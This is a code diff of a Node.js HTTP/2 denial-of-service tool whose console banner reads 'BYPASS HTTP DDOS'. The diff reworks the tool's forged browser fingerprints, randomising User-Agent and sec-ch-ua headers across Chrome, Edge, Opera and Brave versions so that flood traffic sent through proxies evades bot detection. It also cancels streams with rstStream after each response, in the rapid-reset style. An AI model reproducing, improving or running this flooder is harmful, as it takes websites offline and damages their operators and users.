@@ -6,7 +6,7 @@ const net = require("net");
  const crypto = require("crypto");
  const fs = require("fs");
  const colors = require('colors');
-
+const UserAgent = require('user-agents');
 //const errorHandler = error => {
 //    console.log(error);
 //};
@@ -42,6 +42,17 @@ const net = require("net");
    }
    return result;
  }
+
+function randstra(length) {
+		const characters = "0123456789";
+		let result = "";
+		const charactersLength = characters.length;
+		for (let i = 0; i < length; i++) {
+			result += characters.charAt(Math.floor(Math.random() * charactersLength));
+		}
+		return result;
+	}
+
  function getRandomInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
@@ -289,72 +300,61 @@ const rateHeaders5 = [
 { "pragma": "no-cache" },
 { "referer": "https://" + parsedTarget.host + "/" },
 ];
-function randstra(length) {
-		const characters = "0123456789";
-		let result = "";
-		const charactersLength = characters.length;
-		for (let i = 0; i < length; i++) {
-			result += characters.charAt(Math.floor(Math.random() * charactersLength));
-		}
-		return result;
-}
-
-const a = getRandomInt(108,131);
-const b = getRandomInt(108,128);
-const c = getRandomInt(108,129);
-const d = getRandomInt(108,131);
-const e = getRandomInt(108,127);
-var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
-var architectures = {
-  "Windows NT 10.0": `Win64; x64`,
-  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`  ,
-  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:${a}.0` : `Linux x86_64`
-};
 
 
-
-function getRandomValue(arr) {
-  const randomIndex = Math.floor(Math.random() * arr.length);
-  return arr[randomIndex];
-}
-
-const randomOS = getRandomValue(operatingSystems);
-const randomArch = architectures[randomOS]; 
-
-var uas =  `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36`
-var ua1 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b}.0.0.0 Safari/537.36 Edg/${b}`
-var ua2 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Safari/537.36 OPR/${c}`
-var uass = `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:${d}.0) Gecko/20100101 Firefox/${d}`
-
-var uasss = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${e}.0.0.0 Safari/537.36 Brave/${e}.0.0.0`
-var ch_ua = `"\"Google Chrome\";v=\"${a}\", \"Chromium\";v=\"${a}\", \"Not:A-Brand\";v=\"99\""
-`
-
-let ch_ua_v;
-    if (randomOS === "Windows NT 10.0") {
-        ch_ua_v = `Windows`;
+const browserVersion = getRandomInt(125,130);
+    const fwfw = ['Google Chrome'];
+    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
+    let brandValue;
+    if (browserVersion === 125) {
+        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
     }
-else if (randomOS === "Macintosh") {
-        ch_ua_v = `macOSX`;
+    else if (browserVersion === 126) {
+        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
     }
- else if (randomOS === "X11") {
-        ch_ua_v = `Linux`;
+    else if (browserVersion === 127) {
+        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+    }
+  else if (browserVersion === 128) {
+        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+    }
+  else if (browserVersion === 129) {
+        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+    }
+  else if (browserVersion === 130) {
+        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
     }
 
-
-const ch_ua_ver = `${ch_ua_v}`;
-
-const uap = [ 
-uas,
-uass,
-uasss,
-ua1,
-ua2,
+    const userAgent = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
+   const userAgent1 = `Windows NT 10.0: Win64: x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+  const userAgent3 = `Mozilla/5.0 (iPhone; CPU iPhone OS 1${randstra(1)}_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile/15E148`;
+ const userAgent5 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/129.0.2792.79`;
+ const userAgent6 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/${browserVersion}.0.0.0`;
+ const userAgent7 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.2352.52 Safari/537.36 Edg/${browserVersion}.0.527.106`;
+ const userAgent9 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${browserVersion}.0.4577.63 Safari/537.36`;
+var valueofgod = 1;
+                    var signature_0x1 = getRandomInt(82, 110);
+                    var cookie;
+                    var signature_0x2 = getRandomInt(80, 99);
+                    var signature_0x3 = getRandomInt(70, 99);
+                     
+                     const mobiledd = getRandomInt(0, 1);
+                    
+                    var randUserAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36 OPR/${signature_0x2}.0.0.0`
+    const secChUa = `${brandValue}`;
+const u = [
+userAgent,
+userAgent1,
+userAgent3,
+userAgent5,
+userAgent6,
+userAgent7,
+userAgent9,
+randUserAgent,
 ];
 
 
-
-const userAgent = uap[Math.floor(Math.random() * uap.length)];
+const uap = u[Math.floor(Math.random() * u.length)];
 
  if (cluster.isMaster) {
     console.log(`[!] HTTP/2 | BYPASS HTTP DDOS`.red);
@@ -421,14 +421,13 @@ const userAgent = uap[Math.floor(Math.random() * uap.length)];
  headers[":path"] = path;
  headers[":scheme"] = "https";
  headers["upgrade-insecure-requests"]= "1";
- headers["sec-ch-ua"] = ch_ua;
- headers["sec-ch-ua-platform"]= ch_ua_ver;
+ headers["sec-ch-ua"] = secChUa;
  headers["sec-ch-ua-mobile"] = "?0";
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
  headers["sec-fetch-site"] = "none";
  headers["sec-fetch-user"] = "1";
- 
+ headers["user-agent"] = uap;
   function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
@@ -493,7 +492,6 @@ const userAgent = uap[Math.floor(Math.random() * uap.length)];
                   ...headers,
                   ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
                   ...rateHeaders5[Math.floor(Math.random()*rateHeaders5.length)],
-                  "user-agent": userAgent,
                   ...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],
                   ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                 };
@@ -501,6 +499,7 @@ const userAgent = uap[Math.floor(Math.random() * uap.length)];
                     const request = client.request(dynHeaders)
                     
                     client.on("response", response => {
+            console.log(`[Duong] ${args.target} ${headers[':status']} ${uap} ${secChUa}`);
                         request.rstStream(http2.constants.NGHTTP2_CANCEL);
                         //request.write(random);
         
